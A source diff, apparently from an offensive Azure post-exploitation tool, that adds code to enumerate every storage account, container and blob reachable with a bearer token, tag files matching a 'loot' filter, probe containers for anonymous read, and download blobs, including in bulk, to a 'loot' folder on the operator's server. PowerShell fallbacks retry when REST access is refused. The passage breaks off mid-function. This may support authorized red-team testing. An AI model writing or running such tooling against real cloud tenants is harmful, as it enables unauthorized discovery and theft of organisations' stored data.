+        auto phase2Blobs = [this, contItems, contCount]() {
+            appendLog(QString("[+] %1 container(s) across all accounts. Listing blobs...")
+                          .arg(*contCount), "green");
+            if (contItems->isEmpty() || !hasStorageToken()) {
+                setLoading(false);
+                if (!hasStorageToken())
+                    appendLog("[!] No storage token yet - double-click a container to list its blobs.", "yellow");
+                return;
+            }
+            auto pending = std::make_shared<int>(contItems->size());
+            auto totalBlobs = std::make_shared<int>(0);
+            auto totalLoot  = std::make_shared<int>(0);
+            for (auto it = contItems->constBegin(); it != contItems->constEnd(); ++it) {
+                const QString acct = it.key().section('/', 0, 0);
+                const QString cont = it.key().section('/', 1);
+                QTreeWidgetItem *ci = it.value();
+                const QString url = QString("%1/%2?restype=container&comp=list").arg(accountHostFor(acct), cont);
+                QNetworkReply *r = track(net->get(dataRequest(url)));
+                if (!r) { --(*pending); continue; }
+                connect(r, &QNetworkReply::finished, this,
+                        [this, r, ci, pending, totalBlobs, totalLoot]() {
+                    r->deleteLater();
+                    activeReplies.removeOne(r);
+                    if (r->error() == QNetworkReply::NoError) {
+                        const QString xml = QString::fromUtf8(r->readAll());
+                        QRegularExpression blobRe("<Blob>([\\s\\S]*?)</Blob>");
+                        QRegularExpression nameRe("<Name>([^<]+)</Name>");
+                        QRegularExpression sizeRe("<Content-Length>([^<]+)</Content-Length>");
+                        auto bit = blobRe.globalMatch(xml);
+                        while (bit.hasNext()) {
+                            const QString e = bit.next().captured(1);
+                            const QString name = nameRe.match(e).captured(1);
+                            const qint64 bytes = sizeRe.match(e).captured(1).toLongLong();
+                            auto *bi = new QTreeWidgetItem(ci);
+                            bi->setText(0, name); bi->setText(1, "Blob");
+                            bi->setText(2, humanSize(bytes));
+                            bi->setData(0, Qt::UserRole, "blob");
+                            if (isLootName(name)) {
+                                bi->setText(4, "LOOT");
+                                for (int c = 0; c < 5; ++c)
+                                    bi->setForeground(c, StyleManager::colorForAuditAction("token"));
+                                ++(*totalLoot);
+                            }
+                            ++(*totalBlobs);
+                        }
+                    }
+                    if (--(*pending) <= 0) {
+                        setLoading(false);
+                        appendLog(QString("[+] Enumerated %1 blob(s)%2")
+                                      .arg(*totalBlobs)
+                                      .arg(*totalLoot ? QString(", %1 flagged LOOT").arg(*totalLoot) : QString()),
+                                  *totalLoot ? "yellow" : "green");
+                    }
+                });
+            }
+        };
+
+        auto maybePhase2 = [accountsPending, containersPending, phase2Blobs]() {
+            if (*accountsPending == 0 && *containersPending == 0) phase2Blobs();
+        };
+
+        for (const QJsonValue &sv : subs) {
+            const QString subId = sv.toObject().value("subscriptionId").toString();
+            if (subId.isEmpty()) { --(*accountsPending); maybePhase2(); continue; }
+
+            const QString accUrl = QString("https://management.azure.com/subscriptions/%1/providers/"
+                                           "Microsoft.Storage/storageAccounts?api-version=2021-09-01").arg(subId);
+            QNetworkReply *ar = track(net->get(NetworkHelper::createBearerRequest(accUrl, mgmtToken)));
+            if (!ar) { --(*accountsPending); maybePhase2(); continue; }
+            connect(ar, &QNetworkReply::finished, this,
+                    [this, ar, mgmtToken, accountsPending, containersPending, accItems, contItems, contCount, maybePhase2]() {
+                ar->deleteLater();
+                activeReplies.removeOne(ar);
+                if (NetworkHelper::isReplySuccess(ar)) {
+                    const QJsonArray arr = QJsonDocument::fromJson(ar->readAll()).object().value("value").toArray();
+                    for (const QJsonValue &av : arr) {
+                        const QJsonObject a = av.toObject();
+                        const QString acct = a.value("name").toString();
+                        // /subscriptions/<sub>/resourceGroups/<rg>/providers/...
+                        const QString id = a.value("id").toString();
+                        const QString rg = id.section("/resourceGroups/", 1).section('/', 0, 0);
+                        if (acct.isEmpty() || rg.isEmpty()) continue;
+
+                        auto *ai = new QTreeWidgetItem(storageTree);
+                        ai->setText(0, acct); ai->setText(1, "Account");
+                        ai->setData(0, Qt::UserRole, "account");
+                        ai->setExpanded(true);
+                        accItems->insert(acct, ai);
+
+                        // Fetch containers for this account via ARM (no data-plane token needed).
+                        const QString cUrl = QString(
+                            "https://management.azure.com/subscriptions/%1/resourceGroups/%2/providers/"
+                            "Microsoft.Storage/storageAccounts/%3/blobServices/default/containers"
+                            "?api-version=2021-09-01").arg(id.section('/', 2, 2), rg, acct);
+                        ++(*containersPending);
+                        QNetworkReply *cr = track(net->get(NetworkHelper::createBearerRequest(cUrl, mgmtToken)));
+                        if (!cr) { --(*containersPending); maybePhase2(); continue; }
+                        connect(cr, &QNetworkReply::finished, this,
+                                [this, cr, acct, ai, contItems, contCount, containersPending, maybePhase2]() {
+                            cr->deleteLater();
+                            activeReplies.removeOne(cr);
+                            if (NetworkHelper::isReplySuccess(cr)) {
+                                const QJsonArray cs = QJsonDocument::fromJson(cr->readAll()).object().value("value").toArray();
+                                for (const QJsonValue &cv : cs) {
+                                    const QString cname = cv.toObject().value("name").toString();
+                                    if (cname.isEmpty()) continue;
+                                    auto *ci = new QTreeWidgetItem(ai);
+                                    ci->setText(0, cname); ci->setText(1, "Container");
+                                    ci->setData(0, Qt::UserRole, "container");
+                                    ci->setExpanded(true);
+                                    contItems->insert(acct + "/" + cname, ci);
+                                    ++(*contCount);
+                                }
+                            }
+                            --(*containersPending);
+                            maybePhase2();
+                        });
+                    }
+                }
+                --(*accountsPending);
+                maybePhase2();
+            });
+        }
+    });
+}
+
+void AzureStorageWindow::enumerateAllPsLegacy() {
+    // Phase 1: ARM via PowerShell - accounts + containers (Reader role, no data-plane).
+    // Phase 2: REST with storage token - blobs per container (Blob Data Reader).
+    auto doEnum = [this](bool gotToken) {
+        // ARM script: discover accounts and their containers, no blob listing
+        const QString script = QStringLiteral(
+            "$res=@();"
+            "foreach($sa in (Get-AzStorageAccount)){"
+            "  try{$conts=Get-AzRmStorageContainer -StorageAccountName $sa.StorageAccountName "
+            "-ResourceGroupName $sa.ResourceGroupName -ErrorAction Stop}catch{$conts=@()};"
+            "  if(-not $conts){$res+=[PSCustomObject]@{Account=$sa.StorageAccountName;Container='';RG=$sa.ResourceGroupName}};"
+            "  foreach($c in $conts){"
+            "    $res+=[PSCustomObject]@{Account=$sa.StorageAccountName;Container=$c.Name;RG=$sa.ResourceGroupName}"
+            "  }"
+            "}"
+            "$res | ConvertTo-Json -Compress");
+
+        appendLog("[*] Enumerating all storage (accounts + containers via ARM)...", "cyan");
+        storageTree->clear();
+        setLoading(true);
+        runPs(script, [this, gotToken](bool ok, const QString &out) {
+            if (!ok) {
+                setLoading(false);
+                appendLog("[-] ARM enumeration failed:", "red");
+                appendLog(out.trimmed(), "gray");
+                return;
+            }
+            const QJsonArray arr = parsePsJsonArray(out);
+            QMap<QString, QTreeWidgetItem*> accItems;
+            QMap<QString, QTreeWidgetItem*> contItems;
+            int contCount = 0;
+            for (const QJsonValue &v : arr) {
+                const QJsonObject o = v.toObject();
+                const QString acct = o.value("Account").toString();
+                const QString cont = o.value("Container").toString();
+                if (acct.isEmpty()) continue;
+
+                QTreeWidgetItem *ai = accItems.value(acct);
+                if (!ai) {
+                    ai = new QTreeWidgetItem(storageTree);
+                    ai->setText(0, acct); ai->setText(1, "Account");
+                    ai->setData(0, Qt::UserRole, "account");
+                    ai->setExpanded(true);
+                    accItems.insert(acct, ai);
+                }
+                if (cont.isEmpty()) continue;
+                const QString ckey = acct + "/" + cont;
+                if (!contItems.contains(ckey)) {
+                    auto *ci = new QTreeWidgetItem(ai);
+                    ci->setText(0, cont); ci->setText(1, "Container");
+                    ci->setData(0, Qt::UserRole, "container");
+                    ci->setExpanded(true);
+                    contItems.insert(ckey, ci);
+                    ++contCount;
+                }
+            }
+            appendLog(QString("[+] Found %1 account(s), %2 container(s)").arg(accItems.size()).arg(contCount), "green");
+
+            if (!gotToken || contItems.isEmpty()) {
+                setLoading(false);
+                if (!gotToken && contCount > 0)
+                    appendLog("[!] No storage token - blob listing skipped. Double-click a container to retry.", "yellow");
+                return;
+            }
+
+            // Phase 2: list blobs via REST for each container
+            appendLog("[*] Listing blobs via REST...", "cyan");
+            auto pending = std::make_shared<int>(contItems.size());
+            auto totalBlobs = std::make_shared<int>(0);
+            auto totalLoot = std::make_shared<int>(0);
+            for (auto it = contItems.constBegin(); it != contItems.constEnd(); ++it) {
+                const QString acct = it.key().section('/', 0, 0);
+                const QString cont = it.key().section('/', 1);
+                QTreeWidgetItem *ci = it.value();
+                const QString host = accountHostFor(acct);
+                const QString url = QString("%1/%2?restype=container&comp=list").arg(host, cont);
+                QNetworkReply *reply = track(net->get(dataRequest(url)));
+                if (!reply) { --(*pending); continue; }
+                connect(reply, &QNetworkReply::finished, this,
+                        [this, reply, ci, pending, totalBlobs, totalLoot]() {
+                    reply->deleteLater();
+                    activeReplies.removeOne(reply);
+                    if (reply->error() == QNetworkReply::NoError) {
+                        const QString xml = QString::fromUtf8(reply->readAll());
+                        QRegularExpression blobRe("<Blob>([\\s\\S]*?)</Blob>");
+                        QRegularExpression nameRe("<Name>([^<]+)</Name>");
+                        QRegularExpression sizeRe("<Content-Length>([^<]+)</Content-Length>");
+                        auto bit = blobRe.globalMatch(xml);
+                        while (bit.hasNext()) {
+                            const QString e = bit.next().captured(1);
+                            const QString name = nameRe.match(e).captured(1);
+                            const qint64 bytes = sizeRe.match(e).captured(1).toLongLong();
+                            auto *bi = new QTreeWidgetItem(ci);
+                            bi->setText(0, name); bi->setText(1, "Blob");
+                            bi->setText(2, humanSize(bytes));
+                            bi->setData(0, Qt::UserRole, "blob");
+                            if (isLootName(name)) {
+                                bi->setText(4, "LOOT");
+                                for (int c = 0; c < 5; ++c)
+                                    bi->setForeground(c, StyleManager::colorForAuditAction("token"));
+                                ++(*totalLoot);
+                            }
+                            ++(*totalBlobs);
+                        }
+                    }
+                    if (--(*pending) <= 0) {
+                        setLoading(false);
+                        appendLog(QString("[+] Enumerated %1 blob(s)%2")
+                                      .arg(*totalBlobs)
+                                      .arg(*totalLoot ? QString(", %1 flagged LOOT").arg(*totalLoot) : QString()),
+                                  *totalLoot ? "yellow" : "green");
+                    }
+                });
+            }
+        });
+    };
+
+    // Ensure we have a storage token before starting
+    if (hasStorageToken()) {
+        doEnum(true);
+    } else {
+        acquireStorageToken([doEnum](bool ok) { doEnum(ok); });
     }
 }
 
 void AzureStorageWindow::listContainers() {
-    QString token = storageTokenInput->text().trimmed();
-    if (token.isEmpty()) {
-        QMessageBox::warning(this, "Missing Token", "Please enter a storage token.");
-        return;
-    }
-
+    currentStorageAccount = accountInput->text().trimmed();
     if (currentStorageAccount.isEmpty()) {
-        QMessageBox::warning(this, "No Selection", "Please select a storage account.");
+        QMessageBox::warning(this, "No account", "Enter a storage account name first.");
         return;
     }
-
-    appendLog(QString("[*] Listing containers in %1...").arg(currentStorageAccount), "cyan");
     storageTree->clear();
 
-    QString url = QString("https://%1.blob.core.windows.net/?comp=list").arg(currentStorageAccount);
+    if (hasStorageToken()) { listContainersRest(); return; }
+    acquireStorageToken([this](bool ok) {
+        if (ok) listContainersRest();
+        else listContainersPs();
+    });
+}
 
-    QNetworkReply *reply = net->get(storageRequest(url, token));
-    if (!reply) {
-        appendLog("[-] Failed to create network request", "red");
+void AzureStorageWindow::listKnownContainer() {
+    currentStorageAccount = accountInput->text().trimmed();
+    const QString c = containerInput->text().trimmed();
+    if (currentStorageAccount.isEmpty() || c.isEmpty()) {
+        QMessageBox::warning(this, "Missing input", "Enter a storage account and a known container name.");
         return;
     }
+    storageTree->clear();
+    auto *item = new QTreeWidgetItem(storageTree);
+    item->setText(0, c);
+    item->setText(1, serviceCombo->currentText().startsWith("File") ? "Share" : "Container");
+    item->setData(0, Qt::UserRole, "container");
+    storageTree->setCurrentItem(item);
+    if (hasStorageToken()) { listBlobsRest(item); return; }
+    acquireStorageToken([this, item](bool ok) {
+        if (ok) listBlobsRest(item);
+        else listBlobsPs(item);
+    });
+}
 
-    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
+void AzureStorageWindow::listContainersRest() {
+    const bool file = serviceCombo->currentText().startsWith("File");
+    appendLog(QString("[*] Listing %1 in %2 (REST)...").arg(file ? "shares" : "containers", currentStorageAccount), "cyan");
+
+    const QString url = accountHost() + "/?comp=list";
+    QNetworkReply *reply = track(net->get(dataRequest(url)));
+    if (!reply) { appendLog("[-] Failed to create request", "red"); return; }
+    setLoading(true);
+
+    connect(reply, &QNetworkReply::finished, this, [this, reply, file]() {
         reply->deleteLater();
+        activeReplies.removeOne(reply);
+        setLoading(false);
 
-        QString errorMsg;
-        if (!NetworkHelper::isReplySuccess(reply, &errorMsg)) {
-            appendLog(QString("[-] Error: %1").arg(NetworkHelper::parseApiError(reply)), "red");
-
-            int status = NetworkHelper::getHttpStatus(reply);
-            if (status == 403) {
-                appendLog("[!] Access denied. Check storage token permissions.", "yellow");
+        QString err;
+        if (!NetworkHelper::isReplySuccess(reply, &err)) {
+            const int status = NetworkHelper::getHttpStatus(reply);
+            appendLog(QString("[-] REST error (%1): %2").arg(status).arg(NetworkHelper::parseApiError(reply)), "red");
+            if (status == 403 || status == 401) {
+                appendLog("[*] Falling back to PowerShell (Az.Storage)...", "yellow");
+                listContainersPs();
             }
             return;
         }
 
-        // Parse XML response
-        QByteArray data = reply->readAll();
-        QString xml = QString::fromUtf8(data);
-
-        // Simple XML parsing for containers
-        QRegularExpression containerRe("<Name>([^<]+)</Name>");
-        QRegularExpressionMatchIterator i = containerRe.globalMatch(xml);
-
+        const QString xml = QString::fromUtf8(reply->readAll());
+        QRegularExpression nameRe("<Name>([^<]+)</Name>");
+        auto it = nameRe.globalMatch(xml);
         int count = 0;
-        while (i.hasNext()) {
-            QRegularExpressionMatch match = i.next();
-            QString containerName = match.captured(1);
-
+        while (it.hasNext()) {
+            const QString name = it.next().captured(1);
             auto *item = new QTreeWidgetItem(storageTree);
-            item->setText(0, containerName);
-            item->setText(1, "Container");
+            item->setText(0, name);
+            item->setText(1, file ? "Share" : "Container");
             item->setData(0, Qt::UserRole, "container");
-            count++;
+            ++count;
         }
-
-        if (count == 0) {
-            appendLog("[!] No containers found.", "yellow");
-        } else {
-            appendLog(QString("[+] Found %1 container(s)").arg(count), "green");
-        }
+        appendLog(count ? QString("[+] Found %1").arg(count) : QStringLiteral("[!] None found (or no list permission)."),
+                  count ? "green" : "yellow");
     });
 }
 
-void AzureStorageWindow::onContainerSelected(QTreeWidgetItem *item, int column) {
-    Q_UNUSED(column);
-    if (!item) return;
-
-    QString type = item->data(0, Qt::UserRole).toString();
-    if (type == "container") {
-        currentContainer = item->text(0);
+void AzureStorageWindow::listContainersPs() {
+    const bool file = serviceCombo->currentText().startsWith("File");
+    const QString acct = accountInput->text().trimmed();
+    QString script;
+    if (file) {
+        // File shares: Get-AzStorageShare needs $ctx (no ARM equivalent)
+        script = QString("%1; Get-AzStorageShare -Context $ctx | Select-Object Name | ConvertTo-Json -Compress")
+                     .arg(psContextSetup());
+    } else {
+        // Blob containers via ARM (Reader role, no listKeys)
+        script = QString("%1; $sa=Get-AzStorageAccount | Where-Object {$_.StorageAccountName -eq '%2'};"
+                         "if($sa){Get-AzRmStorageContainer -StorageAccountName $sa.StorageAccountName "
+                         "-ResourceGroupName $sa.ResourceGroupName | Select-Object Name | ConvertTo-Json -Compress}"
+                         "else{Write-Error 'Account %2 not found in subscription'}")
+                     .arg(psContextSetup(), acct);
     }
-}
-
-void AzureStorageWindow::listBlobs() {
-    auto *item = storageTree->currentItem();
-    if (!item) return;
-
-    QString type = item->data(0, Qt::UserRole).toString();
-    if (type != "container") return;
-
-    QString token = storageTokenInput->text().trimmed();
-    if (token.isEmpty()) {
-        QMessageBox::warning(this, "Missing Token", "Please enter a storage token.");
-        return;
-    }
-
-    QString containerName = item->text(0);
-    appendLog(QString("[*] Listing blobs in %1/%2...").arg(currentStorageAccount, containerName), "cyan");
-
-    // Clear existing children
-    while (item->childCount() > 0) {
-        delete item->takeChild(0);
-    }
-
-    QString url = QString("https://%1.blob.core.windows.net/%2?restype=container&comp=list")
-                      .arg(currentStorageAccount, containerName);
-
-    QNetworkReply *reply = net->get(storageRequest(url, token));
-    if (!reply) {
-        appendLog("[-] Failed to create network request", "red");
-        return;
-    }
-
-    connect(reply, &QNetworkReply::finished, this, [this, reply, item]() {
-        reply->deleteLater();
-
-        QString errorMsg;
-        if (!NetworkHelper::isReplySuccess(reply, &errorMsg)) {
-            appendLog(QString("[-] Error: %1").arg(NetworkHelper::parseApiError(reply)), "red");
+    appendLog("[*] Listing via PowerShell...", "cyan");
+    setLoading(true);
+    runPs(script, [this, file](bool ok, const QString &out) {
+        setLoading(false);
+        if (!ok) {
+            appendLog("[-] PowerShell listing failed:", "red");
+            appendLog(out.trimmed(), "gray");
+            if (out.contains("AccessTokenAuthenticator") || out.contains("failed to retrieve access token")) {
+                appendLog("[!] This session can't mint a storage token for -UseConnectedAccount. "
+                          "Select a session logged in with credentials (Connect-AzAccount -Credential); "
+                          "an access-token login has no token cache to acquire the storage-audience token.", "yellow");
+            } else if (out.contains("AuthorizationFailure") || out.contains("does not have permission")) {
+                appendLog("[!] The identity lacks the data role on this scope (need e.g. Storage Blob Data Reader).", "yellow");
+            }
             return;
         }
 
-        QByteArray data = reply->readAll();
-        QString xml = QString::fromUtf8(data);
+        const QJsonArray arr = parsePsJsonArray(out);
+        int count = 0;
+        for (const QJsonValue &v : arr) {
+            const QString name = v.toObject().value("Name").toString();
+            if (name.isEmpty()) continue;
+            auto *item = new QTreeWidgetItem(storageTree);
+            item->setText(0, name);
+            item->setText(1, file ? "Share" : "Container");
+            item->setData(0, Qt::UserRole, "container");
+            ++count;
+        }
+        appendLog(count ? QString("[+] Found %1 (PowerShell)").arg(count) : QStringLiteral("[!] None found."),
+                  count ? "green" : "yellow");
+    });
+}
 
-        // Parse blob entries
-        QRegularExpression blobRe("<Blob>([\\s\\S]*?)</Blob>");
+// ============================================================================
+// List blobs / files
+// ============================================================================
+
+void AzureStorageWindow::listChildren() {
+    auto *item = storageTree->currentItem();
+    if (!item || item->data(0, Qt::UserRole).toString() != "container") return;
+
+    currentStorageAccount = accountForItem(item);
+    while (item->childCount() > 0) delete item->takeChild(0);
+
+    if (hasStorageToken()) { listBlobsRest(item); return; }
+    acquireStorageToken([this, item](bool ok) {
+        if (ok) listBlobsRest(item);
+        else listBlobsPs(item);
+    });
+}
+
+void AzureStorageWindow::listBlobsRest(QTreeWidgetItem *containerItem) {
+    const bool file = serviceCombo->currentText().startsWith("File");
+    const QString container = containerItem->text(0);
+    appendLog(QString("[*] Listing %1/%2 (REST)...").arg(currentStorageAccount, container), "cyan");
+
+    const QString url = file
+        ? QString("%1/%2?restype=directory&comp=list").arg(accountHost(), container)
+        : QString("%1/%2?restype=container&comp=list").arg(accountHost(), container);
+
+    QNetworkReply *reply = track(net->get(dataRequest(url)));
+    if (!reply) { appendLog("[-] Failed to create request", "red"); return; }
+    setLoading(true);
+
+    connect(reply, &QNetworkReply::finished, this, [this, reply, containerItem, file]() {
+        reply->deleteLater();
+        activeReplies.removeOne(reply);
+        setLoading(false);
+
+        QString err;
+        if (!NetworkHelper::isReplySuccess(reply, &err)) {
+            const int status = NetworkHelper::getHttpStatus(reply);
+            appendLog(QString("[-] REST error (%1): %2").arg(status).arg(NetworkHelper::parseApiError(reply)), "red");
+            if (status == 403 || status == 401) { appendLog("[*] Falling back to PowerShell...", "yellow"); listBlobsPs(containerItem); }
+            return;
+        }
+
+        const QString xml = QString::fromUtf8(reply->readAll());
+        const QString entryTag = file ? "File" : "Blob";
+        QRegularExpression entryRe(QString("<%1>([\\s\\S]*?)</%1>").arg(entryTag));
         QRegularExpression nameRe("<Name>([^<]+)</Name>");
         QRegularExpression sizeRe("<Content-Length>([^<]+)</Content-Length>");
-        QRegularExpression modifiedRe("<Last-Modified>([^<]+)</Last-Modified>");
+        QRegularExpression modRe("<Last-Modified>([^<]+)</Last-Modified>");
 
-        QRegularExpressionMatchIterator i = blobRe.globalMatch(xml);
+        auto it = entryRe.globalMatch(xml);
+        int count = 0, loot = 0;
+        while (it.hasNext()) {
+            const QString e = it.next().captured(1);
+            const QString name = nameRe.match(e).captured(1);
+            const qint64 bytes = sizeRe.match(e).captured(1).toLongLong();
 
-        int count = 0;
-        while (i.hasNext()) {
-            QRegularExpressionMatch match = i.next();
-            QString blobXml = match.captured(1);
-
-            QString blobName = nameRe.match(blobXml).captured(1);
-            QString size = sizeRe.match(blobXml).captured(1);
-            QString modified = modifiedRe.match(blobXml).captured(1);
-
-            // Format size
-            qint64 bytes = size.toLongLong();
-            QString sizeStr;
-            if (bytes < 1024) {
-                sizeStr = QString("%1 B").arg(bytes);
-            } else if (bytes < 1024 * 1024) {
-                sizeStr = QString("%1 KB").arg(bytes / 1024.0, 0, 'f', 1);
-            } else if (bytes < 1024 * 1024 * 1024) {
-                sizeStr = QString("%1 MB").arg(bytes / (1024.0 * 1024.0), 0, 'f', 1);
-            } else {
-                sizeStr = QString("%1 GB").arg(bytes / (1024.0 * 1024.0 * 1024.0), 0, 'f', 2);
-            }
-
-            auto *blobItem = new QTreeWidgetItem(item);
-            blobItem->setText(0, blobName);
-            blobItem->setText(1, "Blob");
-            blobItem->setText(2, sizeStr);
-            blobItem->setText(3, modified);
+            auto *blobItem = new QTreeWidgetItem(containerItem);
+            blobItem->setText(0, name);
+            blobItem->setText(1, file ? "File" : "Blob");
+            blobItem->setText(2, humanSize(bytes));
+            blobItem->setText(3, modRe.match(e).captured(1));
             blobItem->setData(0, Qt::UserRole, "blob");
-            count++;
+            if (isLootName(name)) {
+                blobItem->setText(4, "LOOT");
+                for (int c = 0; c < 5; ++c) blobItem->setForeground(c, StyleManager::colorForAuditAction("token")); // gold
+                ++loot;
+            }
+            ++count;
         }
+        containerItem->setExpanded(true);
+        appendLog(QString("[+] %1 item(s)%2").arg(count).arg(loot ? QString(", %1 flagged LOOT").arg(loot) : QString()),
+                  loot ? "yellow" : "green");
+    });
+}
 
-        if (count == 0) {
-            appendLog("[!] No blobs found in container.", "yellow");
+void AzureStorageWindow::listBlobsPs(QTreeWidgetItem *containerItem) {
+    const bool file = serviceCombo->currentText().startsWith("File");
+    const QString container = containerItem->text(0);
+    const QString getCmd = file
+        ? QString("Get-AzStorageFile -ShareName '%1'").arg(container)
+        : QString("Get-AzStorageBlob -Container '%1'").arg(container);
+    const QString script = QString("%1; %2 -Context $ctx | Select-Object Name,Length,LastModified | ConvertTo-Json -Compress")
+                               .arg(psContextSetup(), getCmd);
+    appendLog("[*] Listing via PowerShell...", "cyan");
+    setLoading(true);
+    runPs(script, [this, containerItem, file](bool ok, const QString &out) {
+        setLoading(false);
+        if (!ok) {
+            appendLog("[-] PowerShell listing failed:", "red");
+            appendLog(out.trimmed(), "gray");
+            if (out.contains("AccessTokenAuthenticator") || out.contains("failed to retrieve access token")) {
+                appendLog("[!] This session can't mint a storage token for -UseConnectedAccount. "
+                          "Select a session logged in with credentials (Connect-AzAccount -Credential); "
+                          "an access-token login has no token cache to acquire the storage-audience token.", "yellow");
+            } else if (out.contains("AuthorizationFailure") || out.contains("does not have permission")) {
+                appendLog("[!] The identity lacks the data role on this scope (need e.g. Storage Blob Data Reader).", "yellow");
+            }
+            return;
+        }
+        const QJsonArray arr = parsePsJsonArray(out);
+        int count = 0, loot = 0;
+        for (const QJsonValue &v : arr) {
+            const QJsonObject o2 = v.toObject();
+            const QString name = o2.value("Name").toString();
+            if (name.isEmpty()) continue;
+            auto *item = new QTreeWidgetItem(containerItem);
+            item->setText(0, name);
+            item->setText(1, file ? "File" : "Blob");
+            item->setText(2, humanSize(qint64(o2.value("Length").toDouble())));
+            item->setData(0, Qt::UserRole, "blob");
+            if (isLootName(name)) {
+                item->setText(4, "LOOT");
+                for (int c = 0; c < 5; ++c) item->setForeground(c, StyleManager::colorForAuditAction("token"));
+                ++loot;
+            }
+            ++count;
+        }
+        containerItem->setExpanded(true);
+        appendLog(QString("[+] %1 item(s) (PowerShell)%2").arg(count).arg(loot ? QString(", %1 LOOT").arg(loot) : QString()),
+                  loot ? "yellow" : "green");
+    });
+}
+
+void AzureStorageWindow::onTreeItemClicked(QTreeWidgetItem *, int) { /* selection handled on demand */ }
+
+// ============================================================================
+// Public access probe
+// ============================================================================
+
+void AzureStorageWindow::checkPublicAccess() {
+    auto *item = storageTree->currentItem();
+    currentStorageAccount = accountForItem(item);
+    if (!item || item->data(0, Qt::UserRole).toString() != "container") {
+        QMessageBox::information(this, "Select a container", "Select a container/share to test for anonymous read.");
+        return;
+    }
+    const QString container = item->text(0);
+    const QString url = QString("%1/%2?restype=container&comp=list").arg(accountHost(), container);
+    appendLog(QString("[*] Probing anonymous access to %1...").arg(container), "cyan");
+
+    QNetworkReply *reply = track(net->get(dataRequest(url, /*anonymous=*/true)));
+    if (!reply) { appendLog("[-] Failed to create request", "red"); return; }
+    connect(reply, &QNetworkReply::finished, this, [this, reply, container]() {
+        reply->deleteLater();
+        activeReplies.removeOne(reply);
+        const int status = NetworkHelper::getHttpStatus(reply);
+        if (status == 200) {
+            appendLog(QString("[!!] PUBLIC: %1 allows anonymous read (no auth needed).").arg(container), "red");
         } else {
-            appendLog(QString("[+] Found %1 blob(s)").arg(count), "green");
-            item->setExpanded(true);
+            appendLog(QString("[+] Not public (HTTP %1).").arg(status), "green");
         }
     });
 }
 
-void AzureStorageWindow::downloadBlob() {
+// ============================================================================
+// Download
+// ============================================================================
+
+void AzureStorageWindow::downloadSelected() {
     auto *item = storageTree->currentItem();
-    if (!item) {
-        QMessageBox::information(this, "No Selection", "Please select a blob to download.");
+    if (!item || item->data(0, Qt::UserRole).toString() != "blob") {
+        QMessageBox::information(this, "Select a file", "Select a blob/file to download.");
         return;
     }
-
-    QString type = item->data(0, Qt::UserRole).toString();
-    if (type != "blob") {
-        QMessageBox::information(this, "Invalid Selection", "Please select a blob, not a container.");
-        return;
-    }
-
-    QString token = storageTokenInput->text().trimmed();
-    if (token.isEmpty()) {
-        QMessageBox::warning(this, "Missing Token", "Please enter a storage token.");
-        return;
-    }
-
-    // Get container name from parent
     QTreeWidgetItem *parent = item->parent();
     if (!parent) return;
-    QString containerName = parent->text(0);
-    QString blobName = item->text(0);
+    currentStorageAccount = accountForItem(item);
+    const QString container = parent->text(0);
+    const QString name = item->text(0);
+    const bool file = serviceCombo->currentText().startsWith("File");
 
-    QString savePath = QFileDialog::getSaveFileName(this, "Save Blob",
-        blobName.split('/').last(), "All Files (*)");
+    auto doRestDownload = [this, name, container]() {
+        const QString savePath = QFileDialog::getSaveFileName(this, "Save", name.split('/').last(), "All Files (*)");
+        if (savePath.isEmpty()) return;
+        const QString url = QString("%1/%2/%3").arg(accountHost(), container, name);
+        appendLog(QString("[*] Downloading %1 (REST)...").arg(name), "cyan");
+        QNetworkReply *reply = track(net->get(dataRequest(url)));
+        if (!reply) { appendLog("[-] Failed to create request", "red"); return; }
+        connect(reply, &QNetworkReply::finished, this, [this, reply, savePath, name]() {
+            reply->deleteLater();
+            activeReplies.removeOne(reply);
+            QString err;
+            if (!NetworkHelper::isReplySuccess(reply, &err)) {
+                appendLog(QString("[-] Download failed: %1").arg(NetworkHelper::parseApiError(reply)), "red");
+                return;
+            }
+            QFile f(savePath);
+            if (!f.open(QIODevice::WriteOnly)) { appendLog("[-] Could not open file for writing.", "red"); return; }
+            f.write(reply->readAll());
+            f.close();
+            appendLog(QString("[+] Downloaded %1 to %2").arg(name, savePath), "green");
+        });
+    };
 
-    if (savePath.isEmpty()) return;
+    if (hasStorageToken()) { doRestDownload(); return; }
+    acquireStorageToken([this, doRestDownload, file, container, name](bool ok) { if (ok) { doRestDownload(); return; }
 
-    appendLog(QString("[*] Downloading %1...").arg(blobName), "cyan");
-
-    QString url = QString("https://%1.blob.core.windows.net/%2/%3")
-                      .arg(currentStorageAccount, containerName, blobName);
-
-    QNetworkReply *reply = net->get(storageRequest(url, token));
-    if (!reply) {
-        appendLog("[-] Failed to create network request", "red");
-        return;
-    }
-
-    connect(reply, &QNetworkReply::finished, this, [this, reply, savePath, blobName]() {
-        reply->deleteLater();
-
-        QString errorMsg;
-        if (!NetworkHelper::isReplySuccess(reply, &errorMsg)) {
-            appendLog(QString("[-] Download failed: %1").arg(NetworkHelper::parseApiError(reply)), "red");
-            return;
-        }
-
-        QFile file(savePath);
-        if (!file.open(QIODevice::WriteOnly)) {
-            appendLog("[-] Could not open file for writing.", "red");
-            return;
-        }
-
-        file.write(reply->readAll());
-        file.close();
-
-        appendLog(QString("[+] Downloaded %1 to %2").arg(blobName, savePath), "green");
+    // PowerShell download - saves on the ANIMO server host
+    const QString getCmd = file
+        ? QString("Get-AzStorageFileContent -ShareName '%1' -Path '%2' -Destination 'loot' -Force -Context $ctx")
+              .arg(container, name)
+        : QString("Get-AzStorageBlobContent -Container '%1' -Blob '%2' -Destination 'loot' -Force -Context $ctx")
+              .arg(container, name);
+    appendLog(QString("[*] Downloading %1 to ./loot on the ANIMO host...").arg(name), "yellow");
+    runPs(QString("New-Item -ItemType Directory -Force -Path loot | Out-Null; %1; %2")
+              .arg(psContextSetup(), getCmd),
+          [this, name](bool ok, const QString &out) {
+              appendLog(ok ? QString("[+] Saved %1 to ./loot on the ANIMO server host.").arg(name)
+                           : QString("[-] Download failed: %1").arg(out.trimmed()), ok ? "green" : "red");
+          });
     });
 }
 
-void AzureStorageWindow::copyBlobUrl() {
+void AzureStorageWindow::bulkDownloadSelected() {
+    QList<QTreeWidgetItem*> blobs;
+    for (QTreeWidgetItem *it : storageTree->selectedItems())
+        if (it->data(0, Qt::UserRole).toString() == "blob" && it->parent()) blobs.append(it);
+    if (blobs.isEmpty()) {
+        QMessageBox::information(this, "No files selected", "Select one or more blobs/files (Ctrl/Shift-click).");
+        return;
+    }
+
+    auto doRestBulk = [this, blobs]() {
+        const QString dir = QFileDialog::getExistingDirectory(this, "Loot folder");
